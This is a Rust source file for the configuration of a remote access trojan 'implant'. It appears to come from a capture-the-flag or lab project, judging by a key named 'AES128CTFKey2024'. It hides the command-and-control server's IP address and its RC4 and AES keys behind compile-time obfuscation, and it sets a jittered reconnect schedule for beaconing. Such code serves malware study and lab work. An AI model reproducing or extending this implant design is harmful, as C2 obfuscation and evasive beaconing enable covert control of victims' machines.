//! Runtime configuration for the implant.

use std::sync::atomic::{AtomicBool, Ordering};

/// Implant configuration — beacon intervals, C2 address, crypto keys.
pub struct Config {
    /// C2 server IP (XOR-obfuscated at compile time).
    pub c2_ip: String,
    /// C2 server port.
    pub c2_port: u16,
    /// RC4 transport key.
    pub rc4_key: Vec<u8>,
    /// AES-128 payload key.
    pub aes_key: [u8; 16],
    /// Base reconnect delay in milliseconds.
    pub reconnect_delay_ms: u32,
    /// Jitter range (+/- ms) added to the reconnect delay.
    pub reconnect_jitter_ms: u32,
    /// Maximum connection attempts before sleeping.
    pub max_connect_attempts: u32,
    /// Global running flag.
    running: AtomicBool,
}

impl Default for Config {
    fn default() -> Self {
        // Decrypt C2 IP at runtime using the obfuscate! macro
        let ip_bytes = rat_common::obfuscate!("192.168.20.52");
        let c2_ip = String::from_utf8(ip_bytes).unwrap_or_else(|_| "127.0.0.1".into());

        // Decrypt shared keys at runtime
        let rc4_bytes = rat_common::obfuscate!("MySecretKey2024!");
        let aes_bytes = rat_common::obfuscate!("AES128CTFKey2024");

        let mut aes_key = [0u8; 16];
        aes_key.copy_from_slice(&aes_bytes[..16]);

        Self {
            c2_ip,
            c2_port: 50005,
            rc4_key: rc4_bytes,
            aes_key,
            reconnect_delay_ms: 60_000,
            reconnect_jitter_ms: 15_000,
            max_connect_attempts: 5,
            running: AtomicBool::new(true),
        }
    }
}

impl Config {
    /// Whether the implant should keep running.
    pub fn running(&self) -> bool {
        self.running.load(Ordering::Relaxed)
    }

    /// Signal the implant to stop.
    pub fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
    }

    /// Compute a jittered reconnect delay.
    pub fn jittered_delay(&self) -> u32 {
        use rand::Rng;
        let jitter = rand::thread_rng().gen_range(0..self.reconnect_jitter_ms * 2);
        self.reconnect_delay_ms
            .saturating_add(jitter)
            .saturating_sub(self.reconnect_jitter_ms)
    }
}
